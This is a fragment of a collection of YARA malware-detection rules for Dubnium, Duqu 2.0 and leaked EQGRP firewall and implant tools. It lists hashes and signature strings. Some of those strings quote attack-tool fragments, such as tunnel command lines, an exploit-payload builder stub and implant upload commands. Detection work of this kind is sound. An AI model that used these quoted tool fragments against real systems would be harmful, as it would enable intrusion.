  "Dubnium_Sample_SSHOpenSSL": "rule Dubnium_Sample_SSHOpenSSL\n{\n\n    meta:\n        description = \"Detects sample mentioned in the Dubnium Report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/AW9Cuu\"\n        date = \"2016-06-10\"\n        hash1 = \"6f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n        hash2 = \"feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n        hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n        hash4 = \"bd780f4d56214c78045454d31d83ae18ed209cc138e75d138e72976a7ef9803f\"\n        hash5 = \"a25715108d2859595959879ff50085bc85969e9473ecc3d26dda24c4a17822c9\"\n        hash6 = \"e0918072d427d12b43f436bf0797a361996ae436047d4ef8277f11caf2dd481b\"\n\n    strings:\n        $s1 = \"sshkeypairgen.exe\" fullword wide\n        $s2 = \"OpenSSL: FATAL\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}",
  "apt_duqu2_loaders": "rule apt_duqu2_loaders \n{ \n\n    meta:\n\t\tcopyright = \"Kaspersky Lab\"\n\t\tdescription = \"Rule to detect Duqu 2.0 samples\"\n\t\tlast_modified = \"2015-06-09\"\n\t\tversion = \"1.0\"\n\n    strings:\n\t\t$a1 = \"{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}\" wide \n\t\t$a2 = \"\\\\\\\\.\\\\pipe\\\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}\" wide\n\t\t$a4 = \"\\\\\\\\.\\\\pipe\\\\{AB6172ED-8105-4996-9D2A-597B5F827501}\" wide\n\t\t$a5 = \"Global\\\\{B54E3268-DE1E-4c1e-A667-2596751403AD}\" wide\n\t\t$a8 = \"SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'\" wide\n\t\t$a9 = \"SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'\" wide\n\t\t$a7 = \"SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'\" wide\n\t\t$b1 = \"MSI.dll\"\n\t\t$b2 = \"msi.dll\"\n\t\t$b3 = \"StartAction\"\n\t\t$c1 = \"msisvc_32@\" wide\n\t\t$c2 = \"PROP=\" wide\n\t\t$c3 = \"-Embedding\" wide\n\t\t$c4 = \"S:(ML;;NW;;;LW)\" wide\n\t\t$d1 = \"NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer\" nocase\n\t\t$d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}\n\t\n    condition:\n\t\t( (uint16(0) == 0x5a4d) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) ) and filesize < 100000 ) or ( (uint32(0) == 0xe011cfd0) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*)) ) and filesize < 20000000 )\n}",
  "apt_duqu2_drivers": "rule apt_duqu2_drivers \n{ \n\n    meta:\n\t\tcopyright = \"Kaspersky Lab\"\n\t\tdescription = \"Rule to detect Duqu 2.0 drivers\"\n\t\tlast_modified = \"2015-06-09\"\n\t\tversion = \"1.0\"\n\t\n    strings:\n\t\t$a1 = \"\\\\DosDevices\\\\port_optimizer\" wide nocase \n\t\t$a2 = \"romanian.antihacker\" \n\t\t$a3 = \"PortOptimizerTermSrv\" wide \n\t\t$a4 = \"ugly.gorilla1\"\n\t\t$b1 = \"NdisIMCopySendCompletePerPacketInfo\" \n\t\t$b2 = \"NdisReEnumerateProtocolBindings\"\n\t\t$b3 = \"NdisOpenProtocolConfiguration\"\n\tcondition:\n\t\tuint16(0) == 0x5A4D and (any of ($a*) ) and (2 of ($b*)) and filesize < 100000\n}",
  "Duqu2_Generic1": "rule Duqu2_Generic1 \n{\n\n    meta:\n\t\tdescription = \"Kaspersky APT Report - Duqu2 Sample - Generic Rule\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/7yKyOj\"\n\t\tdate = \"2015-06-10\"\n\t\tsuper_rule = 1\n\t\thash0 = \"3f9168facb13429105a749d35569d1e91465d313\"\n\t\thash1 = \"0a574234615fb2382d85cd6d1a250d6c437afecc\"\n\t\thash2 = \"38447ed1d5e3454fe17699f86c0039f30cc64cde\"\n\t\thash3 = \"5282d073ee1b3f6ce32222ccc2f6066e2ca9c172\"\n\t\thash4 = \"edfca3f0196788f7fde22bd92a8817a957c10c52\"\n\t\thash5 = \"6a4ffa6ca4d6fde8a30b6c8739785f4bd2b5c415\"\n\t\thash6 = \"00170bf9983e70e8dd4f7afe3a92ce1d12664467\"\n\t\thash7 = \"32f8689fd18c723339414618817edec6239b18f3\"\n\t\thash8 = \"f860acec9920bc009a1ad5991f3d5871c2613672\"\n\t\thash9 = \"413ba509e41c526373f991d1244bc7c7637d3e13\"\n\t\thash10 = \"29cd99a9b6d11a09615b3f9ef63f1f3cffe7ead8\"\n\t\thash11 = \"dfe1cb775719b529138e054e7246717304db00b1\"\n\t\n    strings:\n\t\t$s0 = \"Global\\\\{B54E3268-DE1E-4c1e-A667-2596751403AD}\" fullword wide\n\t\t$s1 = \"SetSecurityDescriptorSacl\" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 189 times */\n\t\t$s2 = \"msisvc_32@\" fullword wide\n\t\t$s3 = \"CompareStringA\" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1392 times */\n\t\t$s4 = \"GetCommandLineW\" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 1680 times */\n\t\n    condition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}",
  "APT_Kaspersky_Duqu2_procexp": "rule APT_Kaspersky_Duqu2_procexp \n{\n\n    meta:\n\t\tdescription = \"Kaspersky APT Report - Duqu2 Sample - Malicious MSI\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/7yKyOj\"\n\t\tdate = \"2015-06-10\"\n\t\thash1 = \"2422835716066b6bcecb045ddd4f1fbc9486667a\"\n\t\thash2 = \"b120620b5d82b05fee2c2153ceaf305807fa9f79\"\n\t\thash3 = \"288ebfe21a71f83b5575dfcc92242579fb13910d\"\n\t\n    strings:\n\t\t$x1 = \"svcmsi_32.dll\" fullword wide\n\t\t$x2 = \"msi3_32.dll\" fullword wide\n\t\t$x3 = \"msi4_32.dll\" fullword wide\n\t\t$x4 = \"MSI.dll\" fullword ascii\n\t\t$s1 = \"SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'\" fullword wide\n\t\t$s2 = \"Sysinternals installer\" fullword wide /* PEStudio Blacklist: strings */\n\t\t$s3 = \"Process Explorer\" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 5 times */\n\t\n    condition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) ) and ( all of ($s*) )\n}",
  "APT_Kaspersky_Duqu2_SamsungPrint": "rule APT_Kaspersky_Duqu2_SamsungPrint \n{\n\n    meta:\n\t\tdescription = \"Kaspersky APT Report - Duqu2 Sample - file 2a9a5afc342cde12c6eb9a91ad29f7afdfd8f0fb17b983dcfddceccfbc17af69\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/7yKyOj\"\n\t\tdate = \"2015-06-10\"\n\t\thash = \"ce39f41eb4506805efca7993d3b0b506ab6776ca\"\n\t\n    strings:\n\t\t$s0 = \"Installer for printer drivers and applications\" fullword wide /* PEStudio Blacklist: strings */\n\t\t$s1 = \"msi4_32.dll\" fullword wide\n\t\t$s2 = \"HASHVAL\" fullword wide\n\t\t$s3 = \"SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'\" fullword wide\n\t\t$s4 = \"ca.dll\" fullword ascii\n\t\t$s5 = \"Samsung Electronics Co., Ltd.\" fullword wide\n\t\n    condition:\n\t\tuint16(0) == 0x5a4d and filesize < 82KB and all of them\n}",
  "APT_Kaspersky_Duqu2_msi3_32": "rule APT_Kaspersky_Duqu2_msi3_32 \n{\n\n    meta:\n\t\tdescription = \"Kaspersky APT Report - Duqu2 Sample - file d8a849654ab97debaf28ae5b749c3b1ff1812ea49978713853333db48c3972c3\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/7yKyOj\"\n\t\tdate = \"2015-06-10\"\n\t\thash = \"53d9ef9e0267f10cc10f78331a9e491b3211046b\"\n\t\n    strings:\n\t\t$s0 = \"ProcessUserAccounts\" fullword ascii /* PEStudio Blacklist: strings */\n\t\t$s1 = \"SELECT `UserName`, `Password`, `Attributes` FROM `CustomUserAccounts`\" fullword wide /* PEStudio Blacklist: strings */\n\t\t$s2 = \"SELECT `UserName` FROM `CustomUserAccounts`\" fullword wide /* PEStudio Blacklist: strings */\n\t\t$s3 = \"SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'\" fullword wide\n\t\t$s4 = \"msi3_32.dll\" fullword wide\n\t\t$s5 = \"RunDLL\" fullword ascii\n\t\t$s6 = \"MSI Custom Action v3\" fullword wide\n\t\t$s7 = \"msi3_32\" fullword wide\n\t\t$s8 = \"Operating System\" fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 9203 times */\n\t\n    condition:\n\t\tuint16(0) == 0x5a4d and filesize < 72KB and all of them\n}",
  "EQGRP_noclient_3_0_5": "rule EQGRP_noclient_3_0_5 \n{\n    meta:\n        description = \"Detects tool from EQGRP toolset - file noclient-3.0.5.3\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $x1 = \"-C %s 127.0.0.1\\\" scripme -F -t JACKPOPIN4 '&\" fullword ascii\n        $x2 = \"Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo.\" fullword ascii\n        $x3 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n        $x4 = \"Error from ourtn, did not find keys=target in tn.spayed\" fullword ascii\n        $x5 = \"ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )\n}",
  "EQGRP_installdate": "",
  "EQGRP_teflondoor": "rule EQGRP_teflondoor \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file teflondoor.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $x1 = \"%s: abort.  Code is %d.  Message is '%s'\" fullword ascii\n        $x2 = \"%s: %li b (%li%%)\" fullword ascii\n        $s1 = \"no winsock\" fullword ascii\n        $s2 = \"%s: %s file '%s'\" fullword ascii\n        $s3 = \"peer: connect\" fullword ascii\n        $s4 = \"read: write\" fullword ascii\n        $s5 = \"%s: done!\" fullword ascii\n        $s6 = \"%s: %li b\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 1 of ($x*) and 3 of them\n}",
  "EQGRP_durablenapkin_solaris_2_0_1": "rule EQGRP_durablenapkin_solaris_2_0_1 \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = \"recv_ack: %s: Service not supplied by provider\" fullword ascii\n        $s2 = \"send_request: putmsg \\\"%s\\\": %s\" fullword ascii\n        $s3 = \"port undefined\" fullword ascii\n        $s4 = \"recv_ack: %s getmsg: %s\" fullword ascii\n        $s5 = \">> %d -- %d\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 40KB and 2 of them )\n}",
  "EQGRP_teflonhandle": "rule EQGRP_teflonhandle \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file teflonhandle.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = \"%s [infile] [outfile] /k 0x[%i character hex key] </g>\" fullword ascii\n        $s2 = \"File %s already exists.  Overwrite? (y/n) \" fullword ascii\n        $s3 = \"Random Key : 0x\" fullword ascii\n        $s4 = \"done (%i bytes written).\" fullword ascii\n        $s5 = \"%s --> %s...\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and 2 of them\n}",
  "EQGRP_false": "rule EQGRP_false \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file false.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75\n            00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n            00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20\n            2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E\n            0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E\n            0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00\n            00 25 64 20 2D 20 25 64 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and $s1\n}",
  "EQGRP_bc_genpkt": "rule EQGRP_bc_genpkt \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file bc-genpkt\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $x1 = \"load auxiliary object=%s requested by file=%s\" fullword ascii\n        $x2 = \"size of new packet, should be %d <= size <= %d bytes\" fullword ascii\n        $x3 = \"verbosity - show lengths, packet dumps, etc\" fullword ascii\n        $s1 = \"%s: error while loading shared libraries: %s%s%s%s%s\" fullword ascii\n        $s2 = \"cannot dynamically load executable\" fullword ascii\n        $s3 = \"binding file %s to %s: %s symbol `%s' [%s]\" fullword ascii\n        $s4 = \"randomize the initiator cookie\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x457f and filesize < 1000KB and ( 1 of ($s*) and 3 of them )\n}",
  "EQGRP_dn_1_0_2_1": "rule EQGRP_dn_1_0_2_1 \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file dn.1.0.2.1.linux\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = \"Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO\" fullword ascii\n        $s2 = \"invalid format suggest DMAC=00:00:00:00:00:00\" fullword ascii\n        $s3 = \"SMAC=%02x:%02x:%02x:%02x:%02x:%02x\" fullword ascii\n        $s4 = \"Not everything is set yet\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 30KB and 2 of them )\n}",
  "EQGRP_morel": "rule EQGRP_morel \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file morel.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n        hash1 = \"a9152e67f507c9a179bb8478b58e5c71c444a5a39ae3082e04820a0613cd6d9f\"\n\n    strings:\n        $s1 = \"%d - %d, %d\" fullword ascii\n        $s2 = \"%d - %lu.%lu %d.%lu\" fullword ascii\n        $s3 = \"%d - %d %d\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 60KB and all of them )\n}",
  "EQGRP_bc_parser": "rule EQGRP_bc_parser \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file bc-parser\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n        hash1 = \"879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee\"\n\n    strings:\n        $s1 = \"*** Target may be susceptible to FALSEMOREL      ***\" fullword ascii\n        $s2 = \"*** Target is susceptible to FALSEMOREL          ***\" fullword ascii\n\n    condition:\n        uint16(0) == 0x457f and 1 of them\n}",
  "EQGRP_1212": "rule EQGRP_1212 \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - file 1212.pl\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = \"if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))\" fullword ascii\n        $s2 = \"$ans=\\\"$srcip:$srcport -> $dstip:$dstport\\\";\" fullword ascii\n        $s3 = \"return \\\"ERROR:$line is not a valid port\\\";\" fullword ascii\n        $s4 = \"$dstport=hextoPort($dstport);\" fullword ascii\n        $s5 = \"sub hextoPort\" fullword ascii\n        $s6 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n\n    condition:\n        filesize < 6KB and 4 of them\n}",
  "EQGRP_1212_dehex": "rule EQGRP_1212_dehex \n{\n\n    meta:\n        description = \"Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-15\"\n\n    strings:\n        $s1 = \"return \\\"ERROR:$line is not a valid address\\\";\" fullword ascii\n        $s2 = \"print \\\"ERROR: the filename or hex representation needs to be one argument try using \\\\\\\"'s\\\\n\\\";\" fullword ascii\n        $s3 = \"push(@octets,$byte_table{$tempi});\" fullword ascii\n        $s4 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n        $s5 = \"print hextoIP($ARGV[0]);\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x2123 and filesize < 6KB and ( 5 of ($s*) ) ) or ( all of them )\n}",
  "install_get_persistent_filenames": "rule install_get_persistent_filenames \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file install_get_persistent_filenames\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291\"\n\n    strings:\n        $s1 = \"Generates the persistence file name and prints it out.\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and all of them )\n}",
  "EQGRP_create_dns_injection": "rule EQGRP_create_dns_injection\n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file create_dns_injection.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"488f3cc21db0688d09e13eb85a197a1d37902612c3e302132c84e07bc42b1c32\"\n\n    strings:\n        $s1 = \"Name:   A hostname: 'host.network.com', a decimal numeric offset within\" fullword ascii\n        $s2 = \"-a www.badguy.net,CNAME,1800,host.badguy.net \\\\\\\\\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_screamingplow": "rule EQGRP_screamingplow \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file screamingplow.sh\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"c7f4104c4607a03a1d27c832e1ebfc6ab252a27a1709015b5f1617b534f0090a\"\n\n    strings:\n        $s1 = \"What is the name of your PBD:\" fullword ascii\n        $s2 = \"You are now ready for a ScreamPlow\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_MixText": "rule EQGRP_MixText \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file MixText.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"e4d24e30e6cc3a0aa0032dbbd2b68c60bac216bef524eaf56296430aa05b3795\"\n\n    strings:\n        $s1 = \"BinStore enabled implants.\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_tunnel_state_reader": "rule EQGRP_tunnel_state_reader \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file tunnel_state_reader\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"49d48ca1ec741f462fde80da68b64dfa5090855647520d29e345ef563113616c\"\n\n    strings:\n        $s1 = \"Active connections will be maintained for this tunnel. Timeout:\" fullword ascii\n        $s5 = \"%s: compatible with BLATSTING version 1.2\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_payload": "rule EQGRP_payload \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file payload.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"21bed6d699b1fbde74cbcec93575c9694d5bea832cd191f59eb3e4140e5c5e07\"\n\n    strings:\n        $s1 = \"can't find target version module!\" fullword ascii\n        $s2 = \"class Payload:\" fullword ascii\n\n    condition:\n        all of them\n}",
  "EQGRP_eligiblecandidate": "rule EQGRP_eligiblecandidate \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file eligiblecandidate.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"c4567c00734dedf1c875ecbbd56c1561a1610bedb4621d9c8899acec57353d86\"\n\n    strings:\n        $o1 = \"Connection timed out. Only a problem if the callback was not received.\" fullword ascii\n        $o2 = \"Could not reliably detect cookie. Using 'session_id'...\" fullword ascii\n        $c1 = \"def build_exploit_payload(self,cmd=\\\"/tmp/httpd\\\"):\" fullword ascii\n        $c2 = \"self.build_exploit_payload(cmd)\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_BUSURPER_2211_724": "rule EQGRP_BUSURPER_2211_724 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BUSURPER-2211-724.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"d809d6ff23a9eee53d2132d2c13a9ac5d0cb3037c60e229373fc59a4f14bc744\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"_start_text\" fullword ascii\n        $s3 = \"IMPLANT\" fullword ascii\n        $s4 = \"KEEPGOING\" fullword ascii\n        $s5 = \"upgrade_implant\" fullword ascii\n\n    condition:\n        all of them\n}",
  "EQGRP_networkProfiler_orderScans": "rule EQGRP_networkProfiler_orderScans \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file networkProfiler_orderScans.sh\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"ea986ddee09352f342ac160e805312e3a901e58d2beddf79cd421443ba8c9898\"\n\n    strings:\n        $x1 = \"Unable to save off predefinedScans directory\" fullword ascii\n        $x2 = \"Re-orders the networkProfiler scans so they show up in order in the LP\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_epicbanana_2_1_0_1": "rule EQGRP_epicbanana_2_1_0_1 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"4b13cc183c3aaa8af43ef3721e254b54296c8089a0cd545ee3b867419bb66f61\"\n\n    strings:\n        $s1 = \"failed to create version-specific payload\" fullword ascii\n        $s2 = \"(are you sure you did \\\"make [version]\\\" in versions?)\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_sniffer_xml2pcap": "rule EQGRP_sniffer_xml2pcap \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file sniffer_xml2pcap\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"f5e5d75cfcd86e5c94b0e6f21bbac886c7e540698b1556d88a83cc58165b8e42\"\n\n    strings:\n        $x1 = \"-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)\" fullword ascii\n        $x2 = \"convert an XML file generated by the BLATSTING sniffer module into a pcap capture file.\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_BananaAid": "rule EQGRP_BananaAid \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BananaAid\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f\"\n\n    strings:\n        $x1 = \"(might have to delete key in ~/.ssh/known_hosts on linux box)\" fullword ascii\n        $x2 = \"scp BGLEE-\" ascii\n        $x3 = \"should be 4bfe94b1 for clean bootloader version 3.0; \" fullword ascii\n        $x4 = \"scp <configured implant> <username>@<IPaddr>:onfig\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_bo": "rule EQGRP_bo \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file bo\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"aa8b363073e8ae754b1836c30f440d7619890ded92fb5b97c73294b15d22441d\"\n\n    strings:\n        $s1 = \"ERROR: failed to open %s: %d\" fullword ascii\n        $s2 = \"__libc_start_main@@GLIBC_2.0\" fullword ascii\n        $s3 = \"serial number: %s\" fullword ascii\n        $s4 = \"strerror@@GLIBC_2.0\" fullword ascii\n        $s5 = \"ERROR: mmap failed: %d\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 20KB and all of them )\n}",
  "EQGRP_SecondDate_2211": "rule EQGRP_SecondDate_2211 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file SecondDate-2211.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"2337d0c81474d03a02c404cada699cf1b86c3c248ea808d4045b86305daa2607\"\n\n    strings:\n        $s1 = \"SD_processControlPacket\" fullword ascii\n        $s2 = \"Encryption_rc4SetKey\" fullword ascii\n        $s3 = \".got_loader\" fullword ascii\n        $s4 = \"^GET.*(?:/ |\\\\.(?:htm|asp|php)).*\\\\r\\\\n\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 200KB and all of them )\n}",
  "EQGRP_config_jp1_UA": "rule EQGRP_config_jp1_UA \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file config_jp1_UA.pl\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"2f50b6e9891e4d7fd24cc467e7f5cfe348f56f6248929fec4bbee42a5001ae56\"\n\n    strings:\n        $x1 = \"This program will configure a JETPLOW Userarea file.\" fullword ascii\n        $x2 = \"Error running config_implant.\" fullword ascii\n        $x3 = \"NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION \" fullword ascii\n        $x4 = \"First IP address for beacon destination [127.0.0.1]\" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_userscript": "rule EQGRP_userscript \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file userscript.FW\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"5098ff110d1af56115e2c32f332ff6e3973fb7ceccbd317637c9a72a3baa43d7\"\n\n    strings:\n        $x1 = \"Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! \" fullword ascii\n\n    condition:\n        1 of them\n}",
  "EQGRP_BBALL_M50FW08_2201": "rule EQGRP_BBALL_M50FW08_2201 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"80c0b68adb12bf3c15eff9db70a57ab999aad015da99c4417fdfd28156d8d3f7\"\n\n    strings:\n        $s1 = \".got_loader\" fullword ascii\n        $s2 = \"LOADED\" fullword ascii\n        $s3 = \"pageTable.c\" fullword ascii\n        $s4 = \"_start_text\" fullword ascii\n        $s5 = \"handler_readBIOS\" fullword ascii\n        $s6 = \"KEEPGOING\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 40KB and 5 of ($s*) )\n}",
  "EQGRP_BUSURPER_3001_724": "rule EQGRP_BUSURPER_3001_724 \n{\n\n    meta:\n        description = \"EQGRP Toolset Firewall - file BUSURPER-3001-724.exe\"\n        author = \"Florian Roth\"\n        reference = \"Research\"\n        date = \"2016-08-16\"\n        hash1 = \"6b558a6b8bf3735a869365256f9f2ad2ed75ccaa0eefdc61d6274df4705e978b\"\n\n    strings:\n        $s1 = \"IMPLANT\" fullword ascii\n        $s2 = \"KEEPGOING\" fullword ascii\n        $s3 = \"upgrade_implant\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 200KB and 2 of them ) or ( all of them )\n}",
